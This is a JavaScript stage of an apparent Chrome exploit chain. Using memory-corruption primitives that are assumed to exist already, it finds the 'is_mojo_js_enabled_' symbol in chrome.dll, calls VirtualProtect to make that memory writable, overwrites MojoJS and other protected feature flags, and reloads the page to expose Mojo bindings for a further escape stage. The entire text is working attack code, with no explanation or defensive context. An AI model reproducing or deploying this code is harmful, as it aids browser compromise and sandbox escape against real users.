// Enable MojoJS and other protected flags
{
    // Require "is_mojo_js_enabled_" symbol RVA extracted from PDB
    let is_mojo_js_enabled_ = getSymbol("is_mojo_js_enabled_");
    assert(
        typeof is_mojo_js_enabled_ !== "undefined",
        "[-] Can't enable MojoJS: 'is_mojo_js_enabled_' symbol not found for target browser version",
        0
    );


    // Check if mojo is enabled
    let checkMojo = () => {
        let mojo_state = (typeof(Mojo) !== "undefined");
        log(mojo_state ? "[i] MojoJS is enabled" : "[i] MojoJS is not enabled", 1);
        return mojo_state;
    }


    /* Enable protected flags
        - is_mojo_js_enabled_
        - is_mojo_js_test_enabled_
        - is_protected_origin_trials_sample_api_enabled_
        - is_protected_origin_trials_sample_api_dependent_enabled_
        - is_protected_origin_trials_sample_api_implied_enabled_
        - is_test_feature_protected_enabled_
        - is_test_feature_protected_dependent_enabled_
        - is_test_feature_protected_implied_enabled_
    */
    let enableProtectedFlags = () => {
        log("[i] Enabling protected flags", 1);
        const PAGE_READWRITE = 0x04n;
        let old_protect = getDataAddr([0x0, 0x0, 0x0, 0x0]);
        let chrome_dll = getBaseAddr("chrome.dll");
        let kernel32 = getBaseAddr("KERNEL32.DLL");
        let virtual_protect = kernel32 + getExportAddr(kernel32, "VirtualProtect");
        let is_mojo_js_enabled = chrome_dll + is_mojo_js_enabled_;

        callNativeFunction(virtual_protect, is_mojo_js_enabled, 16n, PAGE_READWRITE, old_protect);
        log("[+] Protected memory disabled", 2);

        setBigUint(is_mojo_js_enabled, 0x0101010101010101n);
        setBigUint(is_mojo_js_enabled+0x8n, 0x0101010101010101n);
        log("[+] Protected flags enabled", 2);

        let old_protect_val = getBigUint(old_protect, 4);
        callNativeFunction(virtual_protect, is_mojo_js_enabled, 16n, old_protect_val, old_protect);
        log("[+] Restored protected memory", 2);
    }


    if (!checkMojo()) {
        enableProtectedFlags();

        RELOAD = true;
        throw "[i] Reloading webpage to enable MojoJS";
    }
}
